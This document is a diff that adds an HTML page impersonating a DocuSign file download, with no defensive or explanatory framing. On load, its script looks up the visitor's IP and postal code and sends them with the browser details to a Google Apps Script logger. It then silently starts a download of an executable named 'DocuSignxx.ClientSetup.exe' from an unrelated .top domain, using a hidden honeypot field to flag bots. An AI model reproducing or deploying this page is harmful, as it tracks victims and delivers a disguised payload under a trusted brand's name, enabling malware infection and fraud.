@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Download | DocuSign File</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #e6ecf5, #f3f6fa);
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .card {
+      background: white;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      text-align: center;
+      max-width: 480px;
+      width: 90%;
+      border-left: 6px solid #6264a7;
+    }
+    .card img {
+      width: 90px;
+      margin-bottom: 20px;
+    }
+    .card h1 {
+      font-size: 24px;
+      color: #1b1a19;
+    }
+    .card p {
+      color: #605e5c;
+      font-size: 16px;
+      margin: 20px 0;
+    }
+    .honeypot {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <img src="https://docucdn-a.akamaihd.net/olive/images/2.62.0/global-assets/email-templates/email-logo.png" alt="DocuSign Logo">
+    <h1>Your Document is Ready</h1>
+    <p>Your secure DocuSign file is downloading...</p>
+    <input class="honeypot" type="text" id="hiddenTrap" name="email" autocomplete="off">
+  </div>
+
+  <script>
+    window.addEventListener('DOMContentLoaded', async () => {
+      // Honeypot
+      const isBot = document.getElementById('hiddenTrap').value !== "";
+
+      // Get IP and ZIP
+      let ip = "Unknown", zip = "Unknown";
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const json = await res.json();
+        ip = json.ip;
+        zip = json.postal || "Unknown";
+      } catch {}
+
+      // Log data
+      const log = {
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        referrer: document.referrer,
+        page: window.location.href,
+        ip: ip,
+        zip: zip,
+        isBot: isBot ? "Yes" : "No"
+      };
+
+      // Send to Google Sheet
+      const url = 'https://script.google.com/macros/s/AKfycbwF2YpCBMv1_qEnemKpMoDPasayyGtiQTNRzE0LasYg8jKDlN6a8Dal6e5MGo1oRq3dPw/exec';
+      try {
+        await fetch(url + '?ip=' + encodeURIComponent(ip), {
+          method: 'POST',
+          body: JSON.stringify(log)
+        });
+      } catch (e) {
+        console.warn("Logging failed:", e);
+      }
+
+      // Auto download file
+      const link = document.createElement('a');
+      link.href = 'https://feraypanl.top/Bin/DocuSignxx.ClientSetup.exe?e=Access&y=Guest';
+      link.download = '';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    });
+  </script>
+</body>
+</html>
